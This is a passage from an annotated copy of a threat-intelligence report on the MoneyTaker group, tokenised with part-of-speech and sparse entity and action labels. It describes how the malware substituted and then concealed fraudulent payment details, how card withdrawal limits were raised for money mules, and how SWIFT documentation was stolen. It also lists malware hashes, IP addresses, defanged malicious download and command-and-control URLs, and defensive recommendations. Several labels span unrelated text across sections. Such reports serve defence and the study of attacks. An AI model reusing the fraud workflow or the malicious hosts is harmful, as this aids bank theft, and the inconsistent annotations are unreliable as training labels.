the DT O O
payment NN O O
order NN O O
will MD O O
be VB O O
modified VBN O O
by IN O O
substituting VBG O O
original JJ O O
payment NN O O
details NNS O O
with IN O O
fraudulent JJ O O
ones NNS O O
. . O O

That DT O O
said VBD O O
, , O O
the DT O O
payment NN O O
amount NN O O
does VBZ O O
not RB O O
change NN O O
, , O O
and CC O O
for IN O O
each DT O O
replaced VBN O O
document NN O O
the DT B-Entity 1
attackers NNS I-Entity O
have VBP O O
a DT O O
separate JJ O O
account NN O O
. . O O

The DT O O
accounts NNS O O
for IN O O
which WDT O O
the DT O O
money NN O O
goes VBZ O O
are VBP O O
not RB O O
repeated VBN O O
. . O O

The DT O O
success NN O O
of IN O O
replacement NN O O
is VBZ O O
due JJ O O
to TO O O
the DT O O
fact NN O O
that IN O O
at IN O O
this DT O O
stage NN O O
the DT O O
payment NN O O
order NN O O
has VBZ O O
not RB O O
yet RB O O
been VBN O O
signed VBN O O
, , O O
which WDT O O
will MD O O
occur VB O O
after IN O O
payment NN O O
details NNS O O
are VBP O O
replaced VBN O O
. . O O

For IN O O
further JJ O O
operation NN O O
of IN O O
another DT O O
module NN O O
- : O O
ED NNP O O
, , O O
after IN O O
each DT O O
automated VBN O O
replacement NN O O
the DT O O
XML NNP O O
module NN O O
stores NNS O O
information NN O O
in IN O O
the DT O O
“ JJ O O
Xml-Resultfile JJ O O
” NN O O
file NN O O
in IN O O
the DT O O
following JJ O O
format NN O O
: : O O
# # O O
Id= NN O O
OrigAcc= NN O O
OrigBic= NN O O
OrigCor= NN O O
Purpose= NN O O
HackAcc= NN O O
HackBic= NN O O
HackCor= NN O O
Sum= NN O O
PayerPersonalAcc= NN O O
# # O O
CONCEALMENT NNP O O
MODULE NNP O O
– NNP O O
ED.EXE NNP O O
The DT O O
“ NNP O O
ed.exe NN O O
” NNP O O
file NN O O
is VBZ O O
started VBN O O
by IN O O
the DT O O
main JJ O O
module NN O O
passing VBG O O
the DT O O
name NN O O
of IN O O
a DT O O
new JJ O O
file NN O O
in IN O O
the DT O O
“ NN O O
% NN O O
АРМ JJ O O
КБР CD O O
% NN O O
\exq\chk CC O O
” JJ O O
directory NN O O
and CC O O
the DT O O
configuration NN O O
file NN O O
. . O O

• NN O O
After IN O O
the DT O O
payment NN O O
order NN O O
is VBZ O O
modified VBN O O
, , O O
signed VBN O O
and CC O O
sent VBN O O
, , O O
the DT O O
following VBG O O
activity NN O O
is VBZ O O
performed VBN O O
: : O O
• NN O O
It PRP O O
is VBZ O O
transferred VBN O O
to TO O O
the DT O O
logical JJ O O
control NN O O
where WRB O O
the DT O O
correctness NN O O
of IN O O
the DT O O
electronic JJ O O
payment NN O O
message NN O O
is VBZ O O
checked VBN O O
, , O O
and CC O O
the DT O O
compliance NN O O
of IN O O
the DT O O
payment NN O O
details NNS O O
with IN O O
reference NN O O
data NNS O O
is VBZ O O
established VBN O O
• VB O O
The DT O O
program NN O O
checks VBZ O O
the DT O O
possibility NN O O
of IN O O
payment NN O O
within IN O O
the DT O O
amount NN O O
of IN O O
liquid NN O O
funds NNS O O
in IN O O
the DT O O
bank NN O O
account NN O O
23 CD O O
• VB O O
The DT O O
electronic JJ O O
payment NN O O
message NN O O
is VBZ O O
accepted VBN O O
for IN O O
execution NN O O
; : O O
the DT O O
funds NNS O O
are VBP O O
debited VBN O O
from IN O O
the DT O O
payer NN O O
’ NNP O O
s NN O O
account NN O O
and CC O O
credited VBD O O
to TO O O
the DT O O
beneficiary JJ O O
’ NN O O
s NN O O
account NN O O
• NNS O O
Based VBN O O
on IN O O
the DT O O
results NNS O O
of IN O O
execution NN O O
, , O O
an DT O O
electronic JJ O O
message NN O O
ED206 NNP O O
( ( O O
confirmation NN O O
of IN O O
debit NN O O
) ) O O
is VBZ O O
sent VBN O O
to TO O O
the DT O O
address NN O O
of IN O O
the DT O O
issuer NN O O
. . O O

• VB O O
The DT O O
message NN O O
is VBZ O O
decrypted VBN O O
, , O O
unpacked JJ O O
, , O O
passes VBZ O O
the DT O O
verification NN O O
of IN O O
the DT O O
authentication NN O O
code NN O O
and CC O O
security NN O O
code NN O O
and CC O O
is VBZ O O
stored VBN O O
in IN O O
the DT O O
“ NN O O
% NN O O
APM NNP O O
KBR NNP O O
% NN O O
\exq\chk NNP O O
” NNP O O
directory NN O O
• IN O O
The DT O O
main JJ O O
module NN O O
starts VBZ O O
the DT O O
concealment NN O O
module NN O O
passing VBG O O
the DT O O
incoming VBG O O
electronic JJ O O
message NN O O
. . O O

The DT O O
ED NNP O O
module NN O O
checks NNS O O
whether IN O O
the DT O O
incoming NN O O
electronic JJ O O
message NN O O
is VBZ O O
ED206 NNP O O
( ( O O
debit/credit JJ O O
confirmation NN O O
following VBG O O
the DT O O
results NNS O O
of IN O O
debit JJ O O
transaction NN O O
) ) O O
or CC O O
ED211 NNP O O
( ( O O
following VBG O O
the DT O O
results NNS O O
of IN O O
the DT O O
day NN O O
or CC O O
payment NN O O
batch NN O O
) ) O O
. . O O

For IN O O
ED206 NNP O O
, , O O
the DT O O
field NN O O
“ NNP O O
CorrAcc NNP O O
” NNP O O
is VBZ O O
verified VBN O O
, , O O
for IN O O
ED211 NNP O O
the DT O O
“ JJ O O
PayeePersonalAcc NNP O O
” NNP O O
field NN O O
is VBZ O O
verified VBN O O
. . O O

The DT O O
values NNS O O
of IN O O
these DT O O
fields NNS O O
are VBP O O
compared VBN O O
with IN O O
HackAcc NNP O O
in IN O O
the DT O O
“ JJ O O
Xml-Resultfile JJ O O
” NN O O
file NN O O
( ( O O
this DT O O
is VBZ O O
the DT O O
file NN O O
in IN O O
which WDT O O
the DT O O
XML NNP O O
module NN O O
stores NNS O O
information NN O O
about IN O O
replacements NNS O O
) ) O O
. . O O

If IN O O
the DT O O
values NNS O O
match VBP O O
, , O O
then RB O O
the DT O O
module NN O O
restores VBZ O O
the DT O O
original JJ O O
payment NN O O
details NNS O O
. . O O

This DT O O
means VBZ O O
that IN O O
the DT O O
payment NN O O
order NN O O
is VBZ O O
sent VBN O O
and CC O O
accepted VBN O O
for IN O O
execution NN O O
with IN O O
the DT O O
fraudulent JJ O O
payment NN O O
details NNS O O
, , O O
and CC O O
the DT O O
responses NNS O O
come VBN O O
as IN O O
if IN O O
the DT O O
payment NN O O
details NNS O O
were VBD O O
the DT O O
initial JJ O O
ones NNS O O
. . O O

This DT O O
gives VBZ O O
cybercriminals NNS O O
extra JJ O O
time NN O O
to TO O O
mule VB O O
funds NNS O O
before IN O O
the DT O O
theft NN O O
is VBZ O O
detected VBN O O
. . O O

TEMPORARY NNP O O
FILE NNP O O
MODULE NNP O O
– NNP O O
TXT.EXE NNP O O
The DT O O
main JJ O O
module NN O O
is VBZ O O
also RB O O
able JJ O O
to TO O O
start VB O O
the DT O O
TXT NNP O O
module NN O O
by IN O O
passing VBG O O
the DT O O
name NN O O
of IN O O
the DT O O
temporary JJ O O
file NN O O
of IN O O
the DT O O
AWS NNP O O
CBR NNP O O
as IN O O
an DT O O
argument NN O O
. . O O

However RB O O
, , O O
we PRP O O
have VBP O O
not RB O O
managed VBN O O
to TO O O
obtain VB O O
this DT O O
module NN O O
and CC O O
do VBP O O
not RB O O
know VB O O
its PRP$ O O
function NN O O
. . O O

All DT O O
MoneyTaker NNP O O
modules NNS O O
do VBP O O
not RB O O
have VB O O
information NN O O
displayed VBN O O
and CC O O
actively RB O O
record VB O O
their PRP$ O O
activity NN O O
to TO O O
log VB O O
files NNS O O
. . O O

There EX O O
is VBZ O O
also RB O O
the DT O O
possibility NN O O
of IN O O
a DT O O
test NN O O
run NN O O
, , O O
which WDT O O
is VBZ B-Action 1
performed VBN I-Action O
after IN B-Modifier 2
installation NN B-Entity 3
on IN I-Entity O
a DT I-Entity O
computer NN I-Entity O
with IN I-Entity O
AWS NNP I-Entity O
CBR NNP I-Entity O
. . O O

Hackers NNS O O
use VBP O O
it PRP O O
to TO O O
control VB O O
the DT O O
program NN O O
operation NN O O
. . O O

After IN O O
this DT O O
attack NN O O
, , O O
they PRP O O
did VBD O O
not RB O O
conduct VB O O
a DT O O
single JJ O O
new JJ O O
attack NN O O
on IN O O
the DT O O
AWS NNP O O
CBR NNP O O
using VBG O O
this DT O O
tool NN O O
. . O O

24 CD O O
In IN O O
November NNP O O
2017 CD O O
, , O O
they PRP O O
again RB O O
attacked VBD O O
another DT O O
bank NN O O
in IN O O
Russia NNP O O
. . O O

Hackers NNS O O
managed VBD O O
to TO O O
gain VB O O
access NN O O
to TO O O
the DT O O
servers NNS O O
and CC O O
workstations NNS O O
of IN O O
AWS NNP O O
CBR NNP O O
operators NNS O O
, , O O
but CC O O
they PRP O O
were VBD O O
not RB O O
able JJ O O
to TO O O
use VB O O
MoneyTaker NNP O O
malware NN O O
because IN O O
the DT O O
server NN O O
was VBD O O
in IN O O
a DT O O
completely RB O O
isolated JJ O O
segment NN O O
. . O O

After IN O O
an DT O O
unsuccessful JJ O O
attempt NN O O
to TO O O
steal VB B-Action 1
money NN B-Entity 2
through IN I-Entity O
the DT I-Entity O
system NN I-Entity O
of IN I-Entity O
interbank NN I-Entity O
transfers NNS I-Entity O
, , O O
they PRP O O
switched VBD O O
their PRP$ O O
focus NN O O
to TO O O
card VB O O
processing NN O O
as IN O O
in IN O O
the DT O O
the DT O O
US NNP O O
based VBN O O
attacks NNS O O
. . O O

25 CD O O
07 CD O O
POTENTIAL NNP O O
ATTACKS NNP O O
ON NNP O O
SWIFT NNP O O
Through IN O O
analysis NN O O
of IN O O
the DT O O
attackers NNS O O
’ VBP O O
infrastructure NN O O
, , O O
we PRP O O
discovered VBN O O
that IN O O
they PRP O O
always RB O O
try VBP O O
to TO O O
steal VB O O
internal JJ O O
banking NN O O
system NN O O
documentation NN O O
: : O O
administrator NN B-Entity 1
guides NNS I-Entity O
, , I-Entity O
internal JJ I-Entity O
instructions NNS I-Entity O
and CC I-Entity O
regulations NNS I-Entity O
, , I-Entity O
change NN I-Entity O
request NN I-Entity O
forms NNS I-Entity O
, , I-Entity O
transaction NN I-Entity O
logs NNS I-Entity O
, , I-Entity O
etc FW I-Entity O
. . O O

We PRP O O
did VBD O O
not RB O O
find VB O O
any DT O O
evidence NN O O
of IN O O
successful JJ O O
attacks NNS O O
on IN O O
SWIFT NNP O O
conducted VBN O O
by IN O O
this DT O O
group NN O O
, , O O
nor CC O O
did VBD O O
we PRP O O
find VB O O
any DT O O
connections NNS O O
with IN O O
already RB O O
known VBN O O
incidents NNS O O
, , O O
for IN O O
example NN O O
, , O O
in IN O O
Hong NNP O O
Kong NNP O O
, , O O
Ukraine NNP O O
, , O O
or CC O O
Turkey NNP O O
. . O O

However RB O O
, , O O
we PRP O O
know VBP O O
that IN O O
in IN O O
addition NN O O
to TO O O
the DT O O
abovementioned VBN O O
documents NNS B-Action 1
these DT B-Entity 2
threat NN I-Entity O
actors NNS I-Entity O
search VBP B-Action 3
for IN B-Modifier 4
and CC B-Entity 5
copy NN I-Entity O
documents NNS I-Entity O
related VBN I-Entity O
to TO I-Entity O
SWIFT NNP I-Entity O
, , I-Entity O
which WDT I-Entity O
may MD I-Entity O
indicate VB I-Entity O
pending VBG I-Entity O
attacks NNS I-Entity O
on IN I-Entity O
this DT I-Entity O
system NN I-Entity O
. . O O

Now RB O O
hackers NNS O O
have VBP O O
the DT O O
following JJ O O
documents NNS O O
at IN O O
their PRP$ O O
disposal NN O O
: : O O
• NN B-Entity 1
Installation NN I-Entity O
and CC I-Entity O
Administration NNP I-Entity O
Guide NNP I-Entity O
for IN I-Entity O
SWIFT NNP I-Entity O
Alliance NNP I-Entity O
Access RB I-Entity O
7.0 CD I-Entity O
• JJ I-Entity O
Security NNP I-Entity O
Guide NNP I-Entity O
for IN I-Entity O
SWIFT NNP I-Entity O
Alliance NNP I-Entity O
Access NNP I-Entity O
7.0 CD I-Entity O
• NN I-Entity O
System NNP I-Entity O
Administrator NNP I-Entity O
Procedures NNP I-Entity O
, , I-Entity O
for IN I-Entity O
Ocean NNP I-Entity O
Systems NNP I-Entity O
’ NNP I-Entity O
wire NN I-Entity O
transfer NN I-Entity O
product NN I-Entity O
FedLink NNP I-Entity O
• NNS I-Entity O
User NNP I-Entity O
Procedures NNP I-Entity O
Manual NNP I-Entity O
, , O O
for IN O O
Ocean NNP O O
Systems NNP O O
’ NNP O O
wire NN O O
transfer NN O O
product NN O O
FedLink NNP O O
The DT O O
two CD O O
last JJ O O
mentioned JJ O O
documents NNS O O
are VBP O O
of IN O O
interest NN O O
, , O O
because IN O O
they PRP O O
describe VBP O O
how WRB O O
to TO O O
make VB O O
transfers NNS O O
through IN O O
SWIFT NNP O O
using VBG O O
the DT O O
FedLink NNP O O
system NN O O
. . O O

According VBG O O
to TO O O
FedLink NNP O O
’ NNP O O
s VBZ O O
official JJ O O
website NN O O
, , O O
now RB O O
they PRP O O
have VB O O
more JJR O O
than IN O O
200 CD O O
customers NNS O O
in IN O O
the DT O O
US NNP O O
and CC O O
Latin NNP O O
America NNP O O
. . O O

We PRP O O
assume VB O O
that IN O O
banks NNS O O
in IN O O
Latin NNP O O
America NNP O O
may MD O O
become VB B-Action 1
the DT B-Entity 2
next JJ I-Entity O
target NN I-Entity O
of IN I-Entity O
this DT I-Entity O
group NN I-Entity O
. . O O

26 CD O O
Figure NN O O
. . O O

Screenshot NNP O O
of IN O O
the DT O O
guidelines NNS O O
on IN O O
card JJ O O
transaction NN O O
processing VBG O O
via IN O O
terminal NN O O
Figure NN O O
. . O O

Fragment NN O O
on IN O O
Credit NNP O O
limit NN O O
increase NN O O
from IN O O
the DT O O
card NN O O
processing NN O O
guidelines NNS O O
08 CD O O
ATTACK NNP O O
ON NNP O O
CARD NNP O O
PROCESSING NN O O
The DT O O
first JJ O O
attack NN O O
on IN O O
card NN O O
processing NN O O
that IN O O
we PRP O O
attribute VBP O O
to TO O O
this DT O O
group NN O O
was VBD O O
conducted VBN O O
in IN O O
May NNP O O
2016 CD O O
. . O O

Having VBG O O
gained VBN O O
access NN O O
to TO O O
the DT O O
bank NN O O
network NN O O
, , O O
the DT B-Entity 1
attackers NNS I-Entity O
compromised VBN B-Action 2
the DT B-Entity 3
workstation NN I-Entity O
of IN I-Entity O
First NNP I-Entity O
Data NNP I-Entity O
’ NNP I-Entity O
s NN I-Entity O
STAR NNP I-Entity O
network NN I-Entity O
portal NN I-Entity O
operators NNS I-Entity O
, , O O
making VBG O O
the DT O O
changes NNS O O
required VBN O O
and CC O O
withdrawing VBG B-Action 4
the DT B-Entity 5
money NN I-Entity O
. . O O

In IN O O
January NNP O O
2017 CD O O
, , O O
the DT O O
attack NN O O
was VBD O O
repeated VBN O O
in IN O O
another DT O O
bank NN O O
. . O O

Focusing VBG O O
on IN O O
card NN O O
processing VBG O O
systems NNS O O
enables VBZ O O
the DT B-Entity 1
attackers NNS I-Entity O
to TO B-Modifier 2
carry NN B-Entity 3
out RP I-Entity O
attacks NNS I-Entity O
that WDT I-Entity O
are VBP I-Entity O
easier JJR I-Entity O
and CC I-Entity O
safer JJR I-Entity O
for IN I-Entity O
‘ NNP I-Entity O
money NN I-Entity O
mules NNS I-Entity O
’ VBP I-Entity O
who WP I-Entity O
provide VB I-Entity O
cash NN I-Entity O
withdrawals NNS I-Entity O
. . O O

The DT B-Entity 1
attackers NNS I-Entity O
are VBP O O
in IN O O
one CD O O
country NN O O
, , O O
the DT O O
victim NN O O
bank NN O O
is VBZ O O
in IN O O
another DT O O
and CC O O
cash NN O O
is VBZ O O
withdrawn VBN O O
by IN O O
mules NNS O O
in IN O O
a DT O O
third JJ O O
locale NN O O
. . O O

This DT O O
scheme NN O O
is VBZ O O
simple JJ O O
to TO O O
implement VB O O
and CC O O
does VBZ O O
not RB O O
require VB O O
much JJ O O
investment NN O O
from IN O O
attackers NNS O O
. . O O

That DT O O
explains VBZ O O
its PRP$ O O
increased JJ O O
usage NN O O
by IN O O
cybercriminal JJ O O
groups NNS O O
such JJ O O
as IN O O
Moneytaker NNP O O
and CC O O
Cobalt NNP O O
. . O O

The DT O O
scheme NN O O
is VBZ O O
extremely RB O O
simple JJ O O
: : O O
• NN O O
After IN O O
taking VBG O O
control NN O O
over IN O O
a DT O O
bank NN O O
network NN O O
, , O O
the DT B-Entity 1
attackers NNS I-Entity O
checked VBN O O
if IN O O
they PRP O O
could MD O O
connect VB O O
to TO O O
the DT O O
card NN O O
processing NN O O
system NN O O
. . O O

• NN O O
They PRP O O
legally RB O O
opened VBD O O
or CC O O
bought VBD O O
cards NNS O O
of IN O O
the DT O O
bank NN O O
whose WP$ O O
IT NNP O O
system NN O O
they PRP O O
had VBD O O
hacked VBN O O
. . O O

• JJ O O
Money NNP O O
mules NNS O O
– VBP O O
criminals NNS O O
who WP O O
withdraw VBP O O
money NN O O
from IN O O
ATMs NNP O O
– NN O O
with IN O O
previously RB O O
activated VBN O O
cards NNS O O
deployed VBN O O
and CC O O
waited VBN O O
for IN O O
the DT O O
operation NN O O
to TO O O
begin VB O O
. . O O

• NN O O
After IN O O
getting VBG O O
into IN O O
the DT O O
card NN O O
processing NN O O
system NN O O
, , O O
the DT B-Entity 1
attackers NNS I-Entity O
removed VBN O O
or CC O O
increased VBN O O
cash NN O O
withdrawal NN O O
limits NNS O O
for IN O O
the DT O O
cards NNS O O
held VBD O O
by IN O O
the DT O O
mules NNS O O
. . O O

• NN O O
They PRP O O
removed VBD O O
overdraft NN O O
limits NNS O O
, , O O
which WDT O O
made VBD O O
it PRP O O
possible JJ O O
to TO O O
go VB O O
overdrawn NNS O O
even RB O O
with IN O O
debit NN O O
cards NNS O O
. . O O

• NN O O
Using VBG O O
these DT O O
cards NNS O O
, , O O
the DT O O
mules NNS O O
withdrew VBP O O
cash NN O O
from IN O O
ATMs NNP O O
, , O O
one CD O O
by IN O O
one CD O O
. . O O

The DT O O
average JJ O O
loss NN O O
caused VBN O O
by IN O O
one CD O O
attack NN O O
was VBD O O
about IN O O
$ $ O O
500,000 CD O O
USD NNP O O
. . O O

As IN O O
in IN O O
the DT O O
case NN O O
with IN O O
the DT O O
attacks NNS O O
on IN O O
SWIFT NNP O O
, , O O
they PRP O O
gather VBP O O
internal JJ O O
documents NNS O O
from IN O O
banks NNS O O
in IN O O
order NN O O
to TO O O
get VB O O
a DT O O
better JJR O O
understanding NN O O
of IN O O
how WRB O O
to TO O O
handle VB O O
certain JJ O O
systems NNS O O
. . O O

27 CD O O
09 CD O O
USING NN O O
BANKING NN O O
TROJANS NN O O
Through IN O O
analysis NN O O
of IN O O
the DT O O
C NNP O O
& CC O O
C NNP O O
server NN O O
used VBN O O
to TO O O
conduct VB O O
targeted JJ O O
attacks NNS O O
on IN O O
banks NNS O O
, , O O
we PRP O O
discovered VBD O O
two CD O O
related JJ O O
files NNS O O
: : O O
Name NN O O
MD5 NN O O
Type NN O O
c4c.exe NN O O
c7d20b726708a441db3d864457a097833654719513990f823b1deb7c48b65472 NN O O
Citadel NN O O
cbcs.exe NN O O
e01e9cdfff085393362e1e2e3ec8cae33c536053760e65c7617d5a0dfd005874 NN O O
Citadel NNP O O
Backconnect NNP O O
Server NNP O O
The DT O O
c4c.exe NN O O
file NN O O
uses VBZ O O
the DT O O
following JJ O O
address NN O O
as IN O O
the DT O O
C NNP O O
& CC O O
C NNP O O
server NN O O
: : O O
hххp NN O O
: : O O
//82.146.54.5/api/cfg.ashx NN O O
The DT B-Entity 1
sample NN I-Entity O
was VBD I-Entity O
distributed VBN I-Entity O
online NN I-Entity O
as IN I-Entity O
a DT I-Entity O
document NN I-Entity O
named VBN I-Entity O
fedwire NN I-Entity O
_ VBZ I-Entity O
22127061503 CD I-Entity O
_ NN I-Entity O
output NN I-Entity O
_ NNP I-Entity O
report.doc NN I-Entity O
( ( I-Entity O
2818a0c63d729cb CD I-Entity O
1f2d223e15c762209 CD I-Entity O
) ) I-Entity O
, , O O
which WDT O O
was VBD B-Action 2
downloaded VBN I-Action O
from IN B-Modifier 3
the DT B-Entity 4
server NN I-Entity O
hxxp NN I-Entity O
: : I-Entity O
//188.120.235.201/fce2857010e1.exe NN I-Entity O
( ( I-Entity O
369ad5f7bc9a555f3395059 CD I-Entity O
978c720bb CD I-Entity O
) ) I-Entity O
Related JJ I-Entity O
indicators NNS I-Entity O
: : I-Entity O
c4c.exe NN I-Entity O
82.146.54.5 CD I-Entity O
Citadel NN I-Entity O
fedwire_22127061503_output_report.doc NN I-Entity O
188.120.235.201 CD I-Entity O
Downloading VBG I-Entity O
the DT I-Entity O
file NN I-Entity O
fce2857010e1.exe NN I-Entity O
fce2857010e1.exe NN I-Entity O
82.146.54.5 CD I-Entity O
Citadel NN I-Entity O
operating_circular_6_app_e1.docm NN I-Entity O
www.riverbed.com NN I-Entity O
188.120.235.201 CD I-Entity O
188.120.230.218 CD I-Entity O
82.146.54.5 CD I-Entity O
28 CD I-Entity O
10 CD I-Entity O
USING NN I-Entity O
POS NNP I-Entity O
TROJANS NN I-Entity O
Through IN I-Entity O
analysis NN I-Entity O
of IN I-Entity O
the DT I-Entity O
C NNP I-Entity O
& CC I-Entity O
C NNP I-Entity O
server NN I-Entity O
used VBN O O
to TO O O
conduct VB O O
targeted JJ O O
attacks NNS O O
, , O O
we PRP O O
discovered VBD O O
two CD O O
related JJ O O
files NNS O O
: : O O
Name NN B-Entity 5
MD5 NN I-Entity O
Type NN I-Entity O
EmployeeID-847267.doc NN I-Entity O
83d21d808f7408ebcb3947cb88366172 CD I-Entity O
Document NN I-Entity O
with IN I-Entity O
marcos NN I-Entity O
203.exe CD I-Entity O
70d8729ca630dd3b0f9a62998642ec76 CD I-Entity O
Kronos NNS I-Entity O
In IN I-Entity O
November NNP I-Entity O
2016 CD I-Entity O
researchers NNS I-Entity O
at IN I-Entity O
Proofpoint NNP I-Entity O
reported VBD I-Entity O
large JJ I-Entity O
email NN I-Entity O
phishing VBG I-Entity O
campaigns NNS I-Entity O
, , O O
primarily RB O O
targeting VBG O O
companies NNS O O
in IN O O
the DT O O
UK NNP O O
and CC O O
US NNP O O
. . O O

The DT O O
email NN O O
messages NNS O O
contained VBD O O
a DT O O
malicious JJ O O
document NN O O
, , O O
or CC O O
a DT O O
phishing JJ O O
link NN O O
. . O O

When WRB O O
the DT O O
victim NN O O
opened VBD O O
the DT O O
attached JJ O O
document NN O O
, , O O
a DT B-Entity 1
macro NN I-Entity O
which WDT I-Entity O
downloaded VBN I-Entity O
Kronos NNP I-Entity O
banking NN I-Entity O
Trojan NNP I-Entity O
form VBD B-Action 2
the DT B-Entity 3
URL NNP I-Entity O
hxxp NN I-Entity O
: : I-Entity O
//info.docs-sharepoint JJ I-Entity O
[ NN I-Entity O
. . I-Entity O
] JJ I-Entity O
com/officeup NN I-Entity O
[ NNP I-Entity O
. . I-Entity O
] NN I-Entity O
exe NN I-Entity O
. . O O

In IN O O
the DT O O
investigated JJ O O
case NN O O
the DT O O
“ NN O O
203.exe CD O O
” NN O O
file NN O O
was VBD O O
downloaded VBN O O
from IN O O
the DT O O
following VBG O O
link NN O O
: : O O
hххp NN O O
: : O O
//profile.invoice-sharepoint.com/Emplid/officeup.exe JJ O O
, , O O
in IN O O
the DT O O
event NN O O
of IN O O
opening VBG O O
the DT O O
file NN O O
LHarv.xls NNP O O
( ( O O
de05666412026c6d6c4740b79bc NN O O
71dbd6420c0c62ad59cbadcd7d506614bc87d CD O O
) ) O O
The DT O O
Kronos NNP O O
banking NN O O
Trojan NNP O O
reported VBN O O
by IN O O
Proofpoint NNP O O
installed VBD O O
three CD O O
payloads NNS O O
from IN O O
the DT O O
following JJ O O
URLs NN O O
: : O O
hxxp NN O O
: : O O
//networkupdate NN O O
[ NN O O
. . O O
] CC O O
online/kbps/upload/c1c06f7d JJ O O
[ NN O O
. . O O

] NN O O
exe NN O O
Smoke NNP O O
Loader NNP O O
hxxp NN O O
: : O O
//networkupdate NN O O
[ NN O O
. . O O
] CC O O
online/kbps/upload/1f80ff71 JJ O O
[ NN O O
. . O O

] NN O O
exe NN O O
Smoke NNP O O
Loader NNP O O
hxxp NN O O
: : O O
//networkupdate NN O O
[ NN O O
. . O O
] CC O O
online/kbps/upload/a8b05325 JJ O O
[ NN O O
. . O O

] NN O O
exe NN O O
ScanPOS NN O O
ScanPOS NNP O O
is VBZ O O
a DT O O
unique JJ O O
point-of-sale NN O O
( ( O O
PoS NNP O O
) ) O O
malware NN O O
. . O O

Upon IN O O
execution NN O O
, , O O
ScanPOS NNP O O
grabs NN O O
information NN O O
about IN O O
the DT O O
current JJ O O
running NN O O
processes NNS O O
and CC O O
collects VBZ O O
the DT O O
user NN O O
name NN O O
and CC O O
privileges NNS O O
on IN O O
the DT O O
infected JJ O O
system NN O O
. . O O

That DT O O
said VBD O O
, , O O
it PRP O O
is VBZ O O
primarily RB O O
designed VBN O O
to TO O O
dump VB O O
process JJ O O
memory NN O O
and CC O O
search NN O O
for IN O O
payment NN O O
card NN O O
track NN O O
data NNS O O
. . O O

The DT B-Entity 1
Trojan NNP I-Entity O
checks VBZ B-Action 2
any DT B-Entity 3
collected JJ I-Entity O
data NNS I-Entity O
using VBG B-Modifier 4
Luhn NNP B-Entity 5
’ NNP I-Entity O
s NN I-Entity O
algorithm NN I-Entity O
for IN I-Entity O
validation NN I-Entity O
and CC O O
then RB O O
sends VBZ O O
it PRP O O
outbound IN O O
to TO O O
the DT O O
C NNP O O
& CC O O
C NNP O O
server NN O O
. . O O

The DT O O
C NNP O O
& CC O O
C NNP O O
address NN O O
for IN O O
ScanPOS NNP O O
was VBD O O
hxxp VBN O O
: : O O
//invoicesharepoint NN O O
[ NN O O
. . O O

] NN O O
com/ NN O O
gateway RB O O
[ NN O O
. . O O

] NN O O
php NN O O
RECOMMENDATIONS $ O O
11 CD O O
29 CD O O
Run NNP O O
an DT O O
indicator NN O O
check-up NN O O
in IN O O
the DT O O
following JJ O O
section NN O O
Operating NN O O
system NN O O
security NN O O
• JJ O O
Prohibit NNP O O
any DT O O
remote JJ O O
logon NN O O
to TO O O
the DT O O
system NN O O
( ( O O
RDP NNP O O
, , O O
SMB NNP O O
, , O O
RPC NNP O O
) ) O O
for IN O O
local JJ O O
administrators NNS O O
. . O O

We PRP O O
recommend VBP O O
that IN O O
you PRP O O
use VBP O O
only RB O O
Logon NNP O O
type NN O O
2 CD O O
( ( O O
interactive JJ O O
) ) O O
: : O O
https NN O O
: : O O
//technet.microsoft.com/en-ie/library/ JJ O O
cc787567 NN O O
( ( O O
v=ws.10 NN O O
) ) O O
.aspx NN O O
• JJ O O
Configure NNP O O
the DT O O
following JJ O O
parameter NN O O
in IN O O
the DT O O
registry NN O O
on IN O O
all DT O O
PCs NNS O O
running VBG O O
Windows NNP O O
7 CD O O
( ( O O
and CC O O
up RB O O
) ) O O
and CC O O
all PDT O O
the DT O O
servers NNS O O
using VBG O O
Windows NNS O O
2008R2 CD O O
: : O O
HKEY NNP O O
_ NNP O O
LOCAL NNP O O
_ NNP O O
MACHINE/SYSTEM/CurrentControlSet/Control/ NNP O O
SecurityProviders/WDigest/UseLogonCredential=0 NN O O
This DT O O
registry NN O O
key JJ O O
prohibits NNS O O
storing VBG O O
unencrypted JJ O O
passwords NNS O O
in IN O O
RAM NNP O O
( ( O O
which WDT O O
are VBP O O
usually RB O O
leveraged VBN O O
by IN O O
Mimikatz NNP O O
) ) O O
• JJ O O
Prohibit NNP O O
a DT O O
standard JJ O O
local JJ O O
administrator NN O O
with IN O O
an DT O O
ID=500 NNP O O
( ( O O
which WDT O O
is VBZ O O
vulnerable JJ O O
pass-the-hash JJ O O
attack NN O O
) ) O O
. . O O

Add NNP O O
another DT O O
administrator NN O O
and CC O O
install VB O O
updates NNS O O
to TO O O
protect VB O O
against IN O O
Pass NNP O O
the DT O O
hash NN O O
attacks NNS O O
: : O O
https NN O O
: : O O
//technet.microsoft.com/library/security/2871997 JJ O O
# # O O
ID0E3D NNP O O
• JJ O O
Minimize NNP O O
and CC O O
completely RB O O
deny JJ O O
granting VBG O O
administrator NN O O
privileges NNS O O
for IN O O
users NNS O O
of IN O O
local JJ O O
PCs NNS O O
, , O O
especially RB O O
for IN O O
users NNS O O
who WP O O
work VBP O O
with IN O O
external JJ O O
information NN O O
systems NNS O O
. . O O

• NN O O
Use NNP O O
a DT O O
different JJ O O
local JJ O O
Administrator NNP O O
account NN O O
password NN O O
on IN O O
every DT O O
node NN O O
, , O O
which WDT O O
must MD O O
not RB O O
match VB O O
any DT O O
domain NN O O
administration NN O O
credentials NNS O O
. . O O

If IN O O
this DT O O
rule NN O O
is VBZ O O
not RB O O
currently RB O O
applied VBN O O
– NNP O O
change VBP O O
all PDT O O
the DT O O
passwords NNS O O
, , O O
make VBP O O
them PRP O O
unique JJ O O
, , O O
long JJ O O
and CC O O
complex JJ O O
. . O O

Securely RB O O
manage VB O O
local JJ O O
Administrator NNP O O
passwords NNS O O
by IN O O
using VBG O O
specialized JJ O O
tools NNS O O
, , O O
such JJ O O
as IN O O
Microsoft NNP O O
’ NNP O O
s VBD O O
Local NNP O O
Administrator NNP O O
Password NNP O O
Solution NN O O
( ( O O
LAPS NNP O O
) ) O O
. . O O

• JJ O O
Deny NNP O O
granting VBG O O
domain NN O O
administrator NN O O
privileges NNS O O
for IN O O
common JJ O O
user JJ O O
accounts NNS O O
. . O O

In IN O O
order NN O O
to TO O O
perform VB O O
domain NN O O
administrative JJ O O
tasks NNS O O
, , O O
create VBP O O
a DT O O
separate JJ O O
additional JJ O O
domain NN O O
user NN O O
account NN O O
for IN O O
each DT O O
administrator NN O O
, , O O
while IN O O
preventing VBG O O
them PRP O O
from IN O O
performing VBG O O
daily JJ O O
routine JJ O O
administrator NN O O
work NN O O
on IN O O
their PRP$ O O
PCs NNS O O
under IN O O
an DT O O
account NN O O
with IN O O
